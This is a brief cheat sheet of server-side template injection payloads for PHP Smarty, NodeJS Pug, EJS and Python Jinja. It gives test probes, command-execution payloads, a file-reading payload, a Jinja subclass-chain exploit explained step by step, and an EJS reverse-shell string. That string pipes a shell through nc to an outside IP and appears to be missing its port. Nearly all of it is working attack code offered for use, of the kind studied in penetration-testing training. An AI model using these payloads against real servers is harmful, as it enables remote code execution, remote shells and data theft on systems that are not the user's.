# Server Side Injection Includes

## PHP Smarty
```php
{system("ls")}
```

## NodeJS Pug
Otherwise known as JADE.

Basic test:
```js
#{7*7}
```

Exploitation:
```js
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

#{root.process.mainModule.require('child_process').spawnSync('cat', ["filename.txt"]).stdout}
```

## EJS
This works by passing an unrestricted render option via the `view options` parameter of `renderFile` which makes it possible to inject code into `outputFunctionName`.

Reverse Shell:
```sh
http://site.com/page?id=2&settings[view options][outputFunctionName]=x;return process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.125.40');s
```

## Python Jinja
Test:
```py
{{7*7}}
```

Payload:
```py
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```

| CMD | Description |
| --- | ----------- |
| `"".__class__.__mro__[1]` | Access base object class |
| `__subclasses__()` | List all subclasses of object |
| `[157]` | Index for `subprocess.Popen` (changes) | 
| `__repr__.globals..` | Chains dynmaically import and uses `subprocess` module to execute `ls` |

